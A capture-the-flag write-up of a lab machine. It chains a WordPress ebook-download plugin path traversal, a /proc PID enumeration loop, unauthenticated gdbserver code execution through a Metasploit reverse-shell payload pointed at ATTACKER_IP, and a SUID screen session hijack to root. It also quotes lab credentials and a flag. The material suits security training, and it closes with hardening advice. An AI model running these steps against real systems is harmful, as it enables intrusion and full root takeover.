Phase 1

Initial Access — LFI to Process Enumeration to gdbserver RCE

LFI via ebook-download Plugin

The plugin's filedownload.php accepts an ebookdownloadurl parameter with no path validation:

# Read wp-config.php — confirms LFI works
http://backdoor.htb/wp-content/plugins/ebook-download/
    filedownload.php?ebookdownloadurl=../../../wp-config.php
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

# Read /etc/passwd
?ebookdownloadurl=/etc/passwd
user:x:1000:1000:user:/home/user:/bin/bash

Database credentials are found but don't lead anywhere useful (MySQL isn't exposed externally). The real value of this LFI is reading /proc.

Identifying Port 1337 via /proc Enumeration

Nmap couldn't identify the service on port 1337. Linux exposes every process's command line at /proc/PID/cmdline. By brute-forcing PIDs through the LFI, we can identify what's running:

$ for pid in $(seq 1 2000); do
    result=$(curl -s "http://backdoor.htb/wp-content/plugins/ebook-download/\
        filedownload.php?ebookdownloadurl=/proc/$pid/cmdline" | tr '\0' ' ')
    if echo "$result" | grep -q "gdb\|1337"; then
        echo "PID $pid: $result"
    fi
done
PID 815: gdbserver --once 0.0.0.0:1337
Key Technique — /proc Process Enumeration When nmap can't fingerprint a service, and you have an LFI vulnerability, /proc/PID/cmdline reveals the exact command line of every running process. This is often the only way to identify mystery ports on Linux targets. The null bytes in cmdline separate arguments — use tr '\0' ' ' to make it readable.

gdbserver Remote Code Execution

What is gdbserver? GDB's remote debugging server. Developers run it on a target machine so they can attach GDB from their workstation to debug programs remotely. The problem: GDB's remote protocol allows the client to upload files, read/write memory, and execute arbitrary programs on the target. There is no authentication mechanism — anyone who connects has full control. Binding it to 0.0.0.0 (all interfaces) is equivalent to an unauthenticated RCE service.

The --once flag means gdbserver only accepts one connection, then exits. A systemd service restarts it automatically, but there's a brief window between connections. Failed attempts require waiting for the restart.

Use Metasploit's dedicated module for reliability:

msf6 > use exploit/multi/gdb/gdb_server_exec
msf6 > set RHOSTS backdoor.htb
msf6 > set RPORT 1337
msf6 > set LHOST ATTACKER_IP
msf6 > set TARGET 1                    # x86_64
msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 > run

[*] Started reverse TCP handler on ATTACKER_IP:4444
[*] 10.129.96.68:1337 - Performing handshake with gdbserver
[*] 10.129.96.68:1337 - Stepping program to find PC
[*] 10.129.96.68:1337 - Writing payload at ...

Phase 2

Privilege Escalation — Screen SUID Session Hijack

Finding the SUID Binary

$ find / -perm -4000 -type f 2>/dev/null | grep screen
-rwsr-xr-x 1 root root 474280 Feb 23 2021 /usr/bin/screen
What is Screen? screen is a terminal multiplexer — it lets you run multiple virtual terminals within a single SSH session, and processes continue running even after you disconnect. Key commands: screen -ls lists sessions, screen -r name reattaches a detached session, screen -x name attaches to a session someone else is using (multi-user attach). The SUID bit means screen runs as root regardless of who launches it.

Hijacking Root's Session

Root has an active screen session running in the background. Because screen has the SUID bit set, any user can attach to any session — including root's:

user@Backdoor:~$ export TERM=xterm
user@Backdoor:~$ screen -x root/root

root@Backdoor:~# whoami
root

root@Backdoor:~# cat /root/root.txt
cc66fd15c69f777c181d8feeadb530eb
Why export TERM=xterm? Reverse shells often don't set the TERM environment variable. Screen requires it to determine terminal capabilities (cursor movement, colors, etc.). Without it, screen refuses to start with "Must be connected to a terminal." Setting TERM=xterm satisfies this requirement.
Appendix

Key Takeaways

WordPress plugins are the #1 attack surface.

The core WordPress installation was fine. An outdated plugin (ebook-download v1.1) provided the LFI that started the entire chain. Always enumerate plugins aggressively with wpscan -e ap --plugins-detection aggressive.

LFI + /proc = service identification.

When nmap can't fingerprint a port, reading /proc/PID/cmdline through an LFI reveals every process's command line. This identified gdbserver on port 1337 — something no service scan could detect.

gdbserver has zero authentication.

Anyone who can connect gets full control: file upload, memory read/write, arbitrary execution. It should never be bound to 0.0.0.0. Use 127.0.0.1 and SSH tunnels for remote debugging.

--once creates timing windows.

gdbserver's single-connection mode means failed attempts consume the connection. Wait for systemd to restart the service before retrying. Metasploit handles this better than manual GDB.

SUID screen = session hijacking.

A SUID screen binary lets any user attach to any other user's session with screen -x user/session. If root has an active session, it's an instant privilege escalation — no exploit needed, just one command.
